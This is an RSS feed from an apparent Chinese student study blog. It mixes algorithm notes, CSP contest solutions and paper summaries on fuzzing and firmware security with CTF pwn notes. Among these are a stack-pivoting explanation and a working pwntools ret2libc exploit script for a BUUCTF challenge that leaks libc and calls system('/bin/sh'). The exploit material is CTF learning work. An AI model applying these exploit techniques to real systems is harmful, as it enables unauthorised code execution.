      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/%E5%89%8D%E7%BC%80%E5%92%8C%E5%89%8D%E7%BC%80%E5%92%8C%E7%9F%A9%E9%98%B5/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/%E5%89%8D%E7%BC%80%E5%92%8C%E5%89%8D%E7%BC%80%E5%92%8C%E7%9F%A9%E9%98%B5/</guid>
      <description>前缀和 //构建前缀和数组 for (int i = 1; i &amp;lt;= n; i ++ ) s[i] = x + s[i - 1]; //计算某n个连续的数的和 sum = s[i] - s[i - n]; 前缀和矩阵 //构建前缀和矩阵 for (int i = 1; i &amp;lt;= n; i ++ ) for (int j = 1; j &amp;lt;= n; j ++ ) { int x; scanf(&amp;#34;%d&amp;#34;, &amp;amp;x); s[i][j] = x + s[i - 1][j] + s[i][j - 1] - s[i - 1][j - 1]; } //计算矩阵块的和 int get_sum(int x1, int y1, int x2, int y2) { return s[x2][y2] - s[x1 - 1][y2] - s[x2][y1 - 1] + s[x1 - 1][y1 - 1]; } //计算矩阵块的大小 int get_cnt(int x1, int y1, int x2, int y2) { return (x2 - x1 + 1) * (y2 - y1 + 1); } </description>
    </item>
    
    <item>
      <title>后续可能有用的资料</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/3.%E6%9D%82/%E5%90%8E%E7%BB%AD%E5%8F%AF%E8%83%BD%E6%9C%89%E7%94%A8%E7%9A%84%E8%B5%84%E6%96%99/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/3.%E6%9D%82/%E5%90%8E%E7%BB%AD%E5%8F%AF%E8%83%BD%E6%9C%89%E7%94%A8%E7%9A%84%E8%B5%84%E6%96%99/</guid>
      <description> (32条消息) 最新zotero与obsidian笔记联动教程（可代替citations和mdnotes）_qq_43309940的博客-CSDN博客_obsidian和zotero 这篇博客提供了zotero和obsidian联动的方案，功能大概就是可以在obsidian中一键新建论文对应的笔记文档，同时将zotero中的注释同步到obsidian中 缺点1：模板不太适合我，等到后面我的论文笔记形成模式后自己写一下模板 缺点2：文档冗余信息多，关于论文的一些基本信息从zotero中就可以看，没必要同步到笔记中 缺点3：我不习惯直接在论文上做注释，所以注释同步到笔记中这个功能对我来说没啥用 </description>
    </item>
    
    <item>
      <title>差分</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/%E5%B7%AE%E5%88%86/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/%E5%B7%AE%E5%88%86/</guid>
      <description>参考：(17条消息) 差分 &amp;ndash;算法竞赛专题解析（32）罗勇军的博客-CSDN博客</description>
    </item>
    
    <item>
      <title>栈迁移</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/%E6%A0%88%E8%BF%81%E7%A7%BB/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/%E6%A0%88%E8%BF%81%E7%A7%BB/</guid>
      <description>参考：栈迁移原理介绍与应用 - Max1z - 博客园 (cnblogs.com)（这篇写的及其详细）
适用场景 当栈上的空间，或者程序的输入字符数量不够我们进行溢出操作的时候，可以进行栈迁移。比如一般栈溢出的题目都会有一个字符串数组，当程序在读入我们的输入的时候将读取的字符数量写死的时候，可能我们就没有足够的空间去填入 ROP 链。
概述 栈迁移顾名思义就是将原来的程序栈迁移到另一个地方，使得我们可以将构造的 ROP 链完整的填入。 那么想要修改栈的位置，那么就需要修改寄存器 esp 和 ebp 的值。 想要修改 esp 和 ebp 的值，我们需要用到 leave 和 ret 两个 gadget。
原理 leave &amp;amp; ret leave 命令由两句汇编指令组成：mov esp, ebp和pop ebp 它将 ebp 的值交给 esp，然后将栈顶的值弹给 ebp。操作结束后 esp 的值是 old ebp+4，ebp 的值是*old ebp ret 命令是 pop rip 将栈顶的值弹给 rip
两次 leave&amp;amp;ret 我们可以看到 leave 命令可以修改 esp 和 ebp 寄存器，但是只用一次 leave 是无法同时修改 esp 和 ebp 的。因为当我们将栈上的数据覆盖后，执行 leave，只能将栈上的数据 pop 给 ebp，而 esp 没有办法修改。所以我们需要进行两次 leave。</description>
    </item>
    
    <item>
      <title>模糊测试分类</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/1.%E5%8E%9F%E6%96%87/%E5%88%86%E7%B1%BB/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/1.%E5%8E%9F%E6%96%87/%E5%88%86%E7%B1%BB/</guid>
      <description>2023-06-22 16:07 L2Fuzz: Discovering Bluetooth L2CAP Vulnerabilities Using Stateful Fuzz Testing.	DSN	2022
关于蓝牙设备的fuzz 解决的问题：不能有效地生成蓝牙的畸形数据包 本文提出的方法生成的畸形数据包数量增加了46倍，数据包拒绝率大大降低；从八个真实蓝牙设备中检测到五个零日漏洞 Torpedo: A Fuzzing Framework for Discovering Adversarial Container Workloads.	DSN	2022
提出一种方法检测容器中异常的工作负载 Towards Fuzzing Target Lines.	DSN	2022
在本文中，我们建议改进这些想法，使模糊器专注于代码的特定部分 (即行)，我们称之为目标，避免在其他区域浪费资源。 FUZZILLI: Fuzzing for JavaScript JIT Compiler Vulnerabilities.	NDSS	2023
先前的研究不是为了生成真正触发JIT语义的源代码而设计的。 提出了第一个专注于JIT漏洞的模糊器 No Grammar, No Problem: Towards Fuzzing the Linux Kernel without System-Call Descriptions.	NDSS	2023
先前的研究syzkaller 过于依赖语法 FuzzNG不需要复杂的系统调用接口描述来实现功能。相反，FuzzNG利用基本的内核设计特性来重塑和简化模糊器的输入空间。对于每个新目标，FuzzNG只需要一个小的配置: 本质上是fuzzer应该探索的文件和系统调用号列表。 DARWIN: Survival of the Fittest Fuzzing Mutators.</description>
    </item>
    
    <item>
      <title>物联网固件安全缺陷检测研究进展</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/%E7%89%A9%E8%81%94%E7%BD%91%E5%9B%BA%E4%BB%B6%E5%AE%89%E5%85%A8%E7%BC%BA%E9%99%B7%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6%E8%BF%9B%E5%B1%95/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/%E7%89%A9%E8%81%94%E7%BD%91%E5%9B%BA%E4%BB%B6%E5%AE%89%E5%85%A8%E7%BC%BA%E9%99%B7%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6%E8%BF%9B%E5%B1%95/</guid>
      <description>中文译名： 作者：张弛 单位：计算机软件新技术国家重点实验室 (南京大学) 国家： #中国 年份： #2021年 来源： #信息安全学报 关键字： #综述 #嵌入式 笔记建立时间： 2023-02-02 : 21:12
摘要 归纳典型物联网固件实现缺陷类型、产生机理 评价静态分析、符号执行、模糊测试、程序验证、基于机器学习的方法 引言 IEEE 标准 12207-2008 将固件定义为“硬件设备和以只读软件形式存储于硬件设备中的计算机指令和数据的结合”。 固件分为三类 单片固件, 通常采取单个二进制镜像的形式, 无需底层操作系统, 直接基于底层硬件驱动完成所有功能, 或者只包含部分系统的库; 基于 Linux 的固件, 以 Linux 作为底层的系统, 基于 Linux 进行开发; 基于 RTOS 的固件。RTOS (real-time operating system) 是指实时处理数据、没有缓冲延迟的操作系统。 固件中存在缺陷是造成物联网设备遭受安全攻击的根本原因之一。 挑战： 无法获取源码且代码类型复杂 不同类型的固件差别较大 测试用例难以构建 依赖资源及技术不足 固件缺陷及其机理分析 固件中的缺陷可以分为实现缺陷、配置缺陷和定制缺陷。
实现缺陷 内存损坏类缺陷：内存损坏类缺陷指不正确的内存访问导致堆、栈内存发生错误。 命令注入缺陷：命令注入缺陷指由于缺少对用户输入进行完备的检查导致恶意用户可以通过构造输入来运行非预期的命令。 程序逻辑缺陷：程序逻辑缺陷是指程序不严谨的逻辑所留下的缺陷, 使软件无法正常运行或给了不法分子可乘之机。 并发问题缺陷：并发问题缺陷指对多线程运行的固件设计不合理导致固件运行时产生数据竞争、死锁等行为。 配置缺陷 固件上的配置缺陷目前学术界研究缺失, 但大型软件系统和云系统中都有较多研究, 这些研究对固件配置缺陷检测或许会有启发。
功能配置参数缺陷 性能配置参数缺陷：这类缺陷通常不会直接引起系统挂起、崩溃等异常行为, 但是无法提供系统预期的性能, 无法满足用户的需求 权限配置参数缺陷 定制缺陷 ^6e21ca 固件安全缺陷检测技术 目前主流的自动化缺陷检测技术可以分为五类, 分别是静态分析、符号执行、模糊测试、程序验证、机器学习.</description>
    </item>
    
    <item>
      <title>第21次CCF计算机软件能力认证</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/csp/%E7%AC%AC21%E6%AC%A1ccf%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%BD%AF%E4%BB%B6%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/csp/%E7%AC%AC21%E6%AC%A1ccf%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%BD%AF%E4%BB%B6%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/</guid>
      <description>期末预测之安全指数 #include&amp;lt;bits/stdc++.h&amp;gt; using namespace std; int main(){ int n, sum = 0; cin&amp;gt;&amp;gt;n; while(n--){ int s, w; cin&amp;gt;&amp;gt;s&amp;gt;&amp;gt;w; sum += (s*w); } int ans = max(0, sum); cout&amp;lt;&amp;lt;ans; return 0; } n = int(input()) sum = 0 for i in range(0, n): s, w = map(int, input().split()) sum = sum + s * w ans = max(0, sum) print(ans) 期末预测之最佳阈值 关键：巧妙的将计数转变为前缀和问题 问题的关键在于如何快速的统计每一个阈值预测正确的个数？ Y 总的方法是采用前缀和的方法来统计个数，如何将分散的数据转变为可以用前缀和的数据呢，就是按照阈值对数据进行排序。这样的效果就是阈值 i 预测正确的个数就是在 i 前的数据的预测结果为 0 的个数加上在 i 后数据预测结果为 1 的个数。 那么我们维护两个前缀和数组 s1 和 s0，s1 [i]表示 i 前（包括 i）的数据中 1 的个数，s0 [i]同理。那么对于数据 i 对应的阈值来说，预测正确的个数就是 s1 [m] - s1 [i - 1] + s0[i - 1]</description>
    </item>
    
    <item>
      <title>第22次CCF-CSP计算机软件能力认证题解</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/csp/%E7%AC%AC22%E6%AC%A1ccf-csp%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%BD%AF%E4%BB%B6%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81%E9%A2%98%E8%A7%A3/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/csp/%E7%AC%AC22%E6%AC%A1ccf-csp%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%BD%AF%E4%BB%B6%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81%E9%A2%98%E8%A7%A3/</guid>
      <description>灰度直方图 #include&amp;lt;bits/stdc++.h&amp;gt; using namespace std; const int N = 500; const int L = 256; int gray_L[L]; int main(){ int n, m, l, tmp; cin&amp;gt;&amp;gt;n&amp;gt;&amp;gt;m&amp;gt;&amp;gt;l; for(int i = 0; i &amp;lt; n; i ++){ for(int j = 0; j &amp;lt; m; j ++){ cin&amp;gt;&amp;gt;tmp; gray_L[tmp]++; } } for(int i = 0; i &amp;lt; l; i ++){ cout&amp;lt;&amp;lt;gray_L[i]&amp;lt;&amp;lt;&amp;#34; &amp;#34;; } return 0; } n, m, l = map(int, input().split()) ans = [ 0 for i in range(0, 257)] for i in range(0, n): L = list(map(int, input().</description>
    </item>
    
    <item>
      <title>第23次CCF-CSP计算机软件能力认证题解</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/csp/%E7%AC%AC23%E6%AC%A1ccf%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%BD%AF%E4%BB%B6%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/csp/%E7%AC%AC23%E6%AC%A1ccf%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%BD%AF%E4%BB%B6%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/</guid>
      <description>数组推导 当 b[i] == a[i]的情况下，数组 a 的和是最大的情况 当 b[i] == b[i-1]的时候，a[i] == 0 的情况下，数组 a 最小 #include&amp;lt;bits/stdc++.h&amp;gt; using namespace std; const int N = 105; int a[N], b[N]; int n; int main(){ int sum_max = 0, sum_min = 0; cin &amp;gt;&amp;gt; n; cin &amp;gt;&amp;gt; b[0]; sum_max = b[0]; sum_min = b[0]; for(int i = 1; i &amp;lt; n; i++){ cin&amp;gt;&amp;gt; b[i]; sum_max += b[i]; if(b[i] != b[i - 1]) sum_min += b[i]; } cout &amp;lt;&amp;lt; sum_max &amp;lt;&amp;lt; endl &amp;lt;&amp;lt; sum_min; return 0; } 非零段划分 参考 我们可以先做下面这个题，本题算是下面这个题的简化版本。 2014.</description>
    </item>
    
    <item>
      <title>第27次CCF-CSP计算机软件能力认证题解</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/csp/%E7%AC%AC27%E6%AC%A1ccf%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%BD%AF%E4%BB%B6%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81%E9%A2%98%E8%A7%A3/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/csp/%E7%AC%AC27%E6%AC%A1ccf%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%BD%AF%E4%BB%B6%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81%E9%A2%98%E8%A7%A3/</guid>
      <description>如此编码 #include&amp;lt;bits/stdc++.h&amp;gt; using namespace std; const int N = 25; int n,m; int a[N],c[N],b[N]; int main(){ cin&amp;gt;&amp;gt;n&amp;gt;&amp;gt;m; for(int i = 1; i &amp;lt;= n; i++) cin&amp;gt;&amp;gt;a[i]; c[0] = 1; c[1] = a[1]; for(int i = 2 ; i &amp;lt;= n; i++) c[i] = c[i-1] * a[i]; for(int i = 1; i &amp;lt;= n; i++){ b[i] = m % a[i]; m = m / a[i]; } for(int i = 1; i &amp;lt;= n; i++) cout&amp;lt;&amp;lt;b[i]&amp;lt;&amp;lt;&amp;#34; &amp;#34;; return 0; } 何以包邮 ？ 暴力循环的写法，可以过 70%的数据</description>
    </item>
    
    <item>
      <title>第二十次CCF计算机软件能力认证题解</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/csp/%E7%AC%AC%E4%BA%8C%E5%8D%81%E6%AC%A1ccf%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%BD%AF%E4%BB%B6%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81%E9%A2%98%E8%A7%A3/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/csp/%E7%AC%AC%E4%BA%8C%E5%8D%81%E6%AC%A1ccf%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%BD%AF%E4%BB%B6%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81%E9%A2%98%E8%A7%A3/</guid>
      <description>称检测点查询 直接排序选择前三就行
#include &amp;lt;iostream&amp;gt; #include &amp;lt;cstring&amp;gt; #include &amp;lt;algorithm&amp;gt; using namespace std; const int N = 210; int n, X, Y; struct Point { int x, y, d; int id; bool operator&amp;lt; (const Point&amp;amp; t) const { if (d != t.d) return d &amp;lt; t.d; return id &amp;lt; t.id; } }q[N]; int get_dist(int x1, int y1, int x2, int y2) { int dx = x1 - x2; int dy = y1 - y2; return dx * dx + dy * dy; } int main() { cin &amp;gt;&amp;gt; n &amp;gt;&amp;gt; X &amp;gt;&amp;gt; Y; for (int i = 0; i &amp;lt; n; i ++ ) { int x, y; cin &amp;gt;&amp;gt; x &amp;gt;&amp;gt; y; q[i] = {x, y, get_dist(X, Y, x, y), i + 1}; } sort(q, q + n); for (int i = 0; i &amp;lt; 3; i ++ ) cout &amp;lt;&amp;lt; q[i].</description>
    </item>
    
    <item>
      <title>简单题(旧)</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/%E7%AE%80%E5%8D%95%E9%A2%98%E6%97%A7/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/%E7%AE%80%E5%8D%95%E9%A2%98%E6%97%A7/</guid>
      <description>2022-8-28 get_started_3dsctf_2016 | LiuLian (liul14n.top)
2022-8-27 [OGeek2019]babyrop1 有一些本地 libc 函数的用法，参考一下
from pwn import * from LibcSearcher import * p = remote(&amp;#34;node4.buuoj.cn&amp;#34;, 28820) elf=ELF(&amp;#39;./pwn1&amp;#39;) libc=ELF(&amp;#39;./libc-2.23.so&amp;#39;) system_libc=libc.symbols[&amp;#39;system&amp;#39;] binsh_libc=next(libc.search(b&amp;#39;/bin/sh&amp;#39;)) write_plt=elf.plt[&amp;#39;write&amp;#39;] write_got=elf.got[&amp;#39;write&amp;#39;] write_libc=libc.symbols[&amp;#39;write&amp;#39;] read_got=elf.got[&amp;#39;read&amp;#39;] read_plt=elf.plt[&amp;#39;read&amp;#39;] main_addr=0x8048825 #payload1-截断strlen payload1=b&amp;#39;\x00&amp;#39;+b&amp;#39;\xff&amp;#39;*7 p.sendline(payload1) p.recvuntil(&amp;#34;Correct\n&amp;#34;) #pay;pad2 - 泄露read的got地址 payload=b&amp;#39;a&amp;#39;*(0xe7+4)+p32(write_plt)+p32(main_addr) # ret1 ret2 payload+=p32(1)+p32(write_got)+p32(4) #write par1 par2 par3 #write_plt覆盖的是sub_80487D0函数的返回地址，而write函数是main函数的函数，所以后面需要有三个write的参数 p.sendline(payload) write_addr=u32(p.recv(4)) print(&amp;#39;[+]write_addr: &amp;#39;, hex(write_addr))#得到了write在内存中的位置 可以用题目提供的函数共享库算出system在内存中的位置 # libc=LibcSearcher(&amp;#39;read&amp;#39;, read_addr) # libc_base=read_addr-libc.dump(&amp;#39;read&amp;#39;) # system_addr=libc_base+libc.dump(&amp;#39;system&amp;#39;) # binsh_addr=libc_base+libc.dump(&amp;#39;str_bin_sh&amp;#39;) libc_base=write_addr-write_libc system_addr=system_libc+libc_base binsh_addr=binsh_libc+libc_base p.sendline(payload1) p.recvuntil(&amp;#34;Correct\n&amp;#34;) payload=b&amp;#39;a&amp;#39;*(0xe7+4) payload+=p32(system_addr)+p32(main_addr)+p32(binsh_addr)#第二次直接把返回地址改为addr地址 p.</description>
    </item>
    
    <item>
      <title>邻接表</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/%E9%82%BB%E6%8E%A5%E8%A1%A8/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/%E9%82%BB%E6%8E%A5%E8%A1%A8/</guid>
      <description>模板代码 int idx； int h[N], e[N], ne[N], w[N;] // 注意这里要初始化 head 为 -1 memset(h, 0xff, sizeof(h)); // 加入有向边 (x, y)，权值为 z void add(int x, int y, int z) { // 真实数据 e[idx] = y, w[idx] = z; // 在表头 x 处插入 ne[idx] = h[x], h[x] = idx++; } // 访问从 x 出发的所有边，注意这里终止条件的不同 for (int i = h[x]; ~i; i = ne[i]) {//~i表示i不等于-1 int y = e[i], z = w[i]; } 邻接表构成的数据结构图示 注意这里有个容易搞混的点，每条链表上挂的是从对应头结点的所有出边，而不是图中的一条路径。</description>
    </item>
    
    <item>
      <title>闫氏DP分析法</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/%E9%97%AB%E6%B0%8Fdp%E5%88%86%E6%9E%90%E6%B3%95/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/%E9%97%AB%E6%B0%8Fdp%E5%88%86%E6%9E%90%E6%B3%95/</guid>
      <description>题干：N 个物品，每个物品有对应的价值和体积，背包容量为 V，如何选择物品使得在不超过背包容量的前提下，价值之和最大。 每个物品都可以选和不选，两种选择，那么一共有 $2^N$ 两种方案，所以题目是一个有限集合的最值问题，所以可以用 y 氏 DP 法来分析
步骤一：状态表示 $f(i,j)$
确定集合：（i 和 j 表示的意思）在只考虑前 i 个物品，并且物品总体积不超过 j 的选法的集合 属性：（$f(i,j)$ 的值代表的意思，和题意相关）当前集合中的最大价值 步骤二：状态计算 那么 $f(i,j)$ 如何计算呢，对于上述的集合，我们可以分为两个子集 一个子集是没有选择物品 i 的集合 如果不选择物品 i，那么我们只需要找到只考虑前 $i-1$ 个物品，并且物品总体积不超过 j 的选法集合中的最大价值，也就是 $f(i-1,j)$ 一个子集是选择了物品 i 的集合 如果选择了物品 i，那么我们只需要找到只考虑前 $i-1$ 个物品，并且物品总体积不超过 $j-v[i]$ 的选法集合中的最大价值，也就是 $f(i-1,j-v[i])$ 然后加上物品 i 的价值 $w [i]$ $f(i-1,j-v[i])+w[i]$ 注意 j 和 v[i]的大小 板子 #include&amp;lt;iostream&amp;gt; #include&amp;lt;algorithm&amp;gt; using namespace std; const int N=1005; int n,v; int V[N],W[N]; int dp[N][N]; int main(){ cin&amp;gt;&amp;gt;n&amp;gt;&amp;gt;v; for(int i=1;i&amp;lt;=n;i++) cin&amp;gt;&amp;gt;V[i]&amp;gt;&amp;gt;W[i]; for(int i=1;i&amp;lt;=n;i++){ for(int j=0;j&amp;lt;=v;j++){ dp[i][j]=dp[i-1][j]; if(j&amp;gt;=V[i]) dp[i][j]=max(dp[i][j],dp[i-1][j-V[i]]+W[i]); } } cout&amp;lt;&amp;lt;dp[n][v]; return 0; } 优化 #include&amp;lt;iostream&amp;gt; #include&amp;lt;algorithm&amp;gt; using namespace std; const int N=1005; int n,v; int V[N],W[N]; int dp[N]; int main(){ cin&amp;gt;&amp;gt;n&amp;gt;&amp;gt;v; for(int i=1;i&amp;lt;=n;i++) cin&amp;gt;&amp;gt;V[i]&amp;gt;&amp;gt;W[i]; for(int i=1;i&amp;lt;=n;i++) for(int j=v;j&amp;gt;=V[i];j--) dp[j]=max(dp[j],dp[j-V[i]]+W[i]); cout&amp;lt;&amp;lt;dp[v]; return 0; } </description>
    </item>
    
    <item>
      <title>静态链接栈溢出</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E6%A0%88%E6%BA%A2%E5%87%BA/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E6%A0%88%E6%BA%A2%E5%87%BA/</guid>
      <description>利用int 80h系统调用 设置系统调用参数即可执行 execve(&amp;quot;\bin\sh&amp;quot;,0,0)，获取shell ，四个参数分别是 eax、ebx、ecx、edx 使用 mprotect 方法修改bss段, 执行shellcode 借助ROPgadget工具自动生成ropchain，ROPgadget --binary simplerop --ropchain 但是这种方法生成的ropchain太长，可能无法全部输入 例题：cmcc_simplerop（write up） (80条消息) BUUCTF：cmcc_simplerop（write up）_　筱的博客-CSDN博客 (80条消息) CMCC&amp;ndash;simplerop 题解_cmcc simplerop___lifanxin的博客-CSDN博客</description>
    </item>
    
    <item>
      <title>建站</title>
      <link>https://examplesite.com/posts/%E5%BB%BA%E7%AB%99/%E5%BB%BA%E7%AB%99/</link>
      <pubDate>Sun, 11 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/%E5%BB%BA%E7%AB%99/%E5%BB%BA%E7%AB%99/</guid>
      <description>建站小tips</description>
    </item>
    
    <item>
      <title>Automatic Recovery of Fine-grained Compiler Artifacts at the Binary Level</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90/%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/automatic-recovery-of-fine-grained-compiler-artifacts-at-the-binary-level/</link>
      <pubDate>Sun, 11 Jun 2023 02:01:58 +0530</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90/%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/automatic-recovery-of-fine-grained-compiler-artifacts-at-the-binary-level/</guid>
      <description>中文译名：二进制级细粒度编译器工件的自动恢复 作者：Yufei Du 单位：北卡罗来纳大学教堂山分校 国家： #美国 年份： #2022年 来源： #USENIX会议 关键字： #二进制 #编译 #神经网络 代码地址：GitHub - zeropointdynamics/passtell 笔记建立时间： 2023-02-11 09:45
摘要 识别二进制编译器配置使开发人员和分析人员能够定位由优化副作用引起的潜在安全问题，识别二进制克隆，并构建兼容的二进制补丁。 现有的工作重点是使用语义特征和深度学习技术识别编译器家族、版本和优化级别。 本文想要探索恢复二进制文件中每个函数的单独的、细粒度的优化传递。为此，我们开发了一种使用专门设计的功能以及直观和可理解的机器学习模型的方法。 引言 编译器的优化可能带来安全方面的负面影响 死代码消除优化可以删除使用敏感数据后擦除敏感数据的指令，导致敏感数据容易泄露 用更高效的操作取代昂贵操作的强度降低优化可以打开侧通道 避免这些陷阱的一种方法是让开发人员手动调整编译脚本 具有挑战性和耗时的 一些编译器还包含无法手动控制的隐藏优化 现代编译器的代码库太大，用户无法查看和研究优化背后的逻辑 安全关键项目 (如 OpenSSL 和 mbed TLS) 的开发人员采取了另一种方法，即在安全函数的源代码中实现工作区，以“迷惑”编译器，使其不会对安全代码应用优化 但是不能一劳永逸，不适用于未来的编译器版本 除了安全性验证外，编译器优化分类还会影响二进制代码克隆检测和二进制补丁。 编译器配置会导致克隆检测技术性能的显著下降 二进制补丁中，在存在某些编译器优化时，定位要修补的易受攻击函数变得更加困难 当前技术侧重于识别编译器家族、主要编译器版本以及二进制文件的优化级别 缺少更详细的信息，即可能已应用的传递 当前方法依赖于语义特征（列如控制流图）或者采用深度学习的方法 为了输出的可解释性，作者选择了使用具有特殊设计功能的浅层学习。 作者的方法成为 passtell，可以识别影响单个函数安全的优化过程 